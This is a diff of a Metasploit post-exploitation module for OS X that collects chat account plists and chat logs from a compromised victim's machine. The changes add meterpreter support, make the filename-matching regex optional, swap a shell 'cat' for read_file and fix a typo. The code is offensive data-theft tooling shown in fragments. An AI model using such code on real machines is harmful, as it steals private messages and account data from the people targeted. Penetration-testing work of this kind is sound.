@@ -20,14 +20,13 @@ class Metasploit3 < Msf::Post
         victim's machine.  There are three different actions you may choose: ACCOUNTS,
         CHATS, and ALL.  Note that to use the 'CHATS' action, make sure you set the regex
         'PATTERN' option in order to look for certain log names (which consists of a
-        contact's name, and a timestamp).  The current 'PATTERN' option is configured to
-        look for any log created on February 2012 as an example.  To loot both account
-        plists and chat logs, simply set the action to 'ALL'.
+        contact's name, and a timestamp). To loot both account  plists and chat logs,
+        simply set the action to 'ALL'.
       },
       'License'       => MSF_LICENSE,
-      'Author'        => [ 'sinn3r'],
+      'Author'        => [ 'sinn3r' ],
       'Platform'      => [ 'osx' ],
-      'SessionTypes'  => [ "shell" ],
+      'SessionTypes'  => [ 'shell', 'meterpreter' ],
       'Actions'       =>
         [
           ['ACCOUNTS', { 'Description' => 'Collect account-related plists' } ],
@@ -39,7 +38,7 @@ class Metasploit3 < Msf::Post
 
     register_options(
       [
-        OptRegexp.new('PATTERN', [true, 'Match a keyword in any chat log\'s filename', '\(2012\-02\-.+\)\.xml$']),
+        OptRegexp.new('PATTERN', [false, 'Match a keyword in any chat log\'s filename', nil])
       ], self.class)
   end
 
@@ -49,7 +48,7 @@ class Metasploit3 < Msf::Post
   #
   def plutil(filename)
     exec("plutil -convert xml1 #{filename}")
-    data = exec("cat #{filename}")
+    data = read_file(filename)
     return data
   end
 
@@ -76,7 +75,7 @@ class Metasploit3 < Msf::Post
         # Filter out logs
         filtered_logs = []
         logs.each do |log|
-          if log =~ datastore['PATTERN']
+          if datastore['PATTERN'].blank? or log =~ datastore['PATTERN']
             # For debugging purposes, we print all the matches
             vprint_status("Match: #{log}")
             filtered_logs << log
@@ -150,7 +149,7 @@ class Metasploit3 < Msf::Post
       # Save data, and then clean up
       #
       if xml.empty?
-        print_error("#{@peer} - Unalbe to parse: #{file}")
+        print_error("#{@peer} - Unable to parse: #{file}")
       else
         loot << {:filename => file, :data => xml}
         exec("rm #{rand_name}")
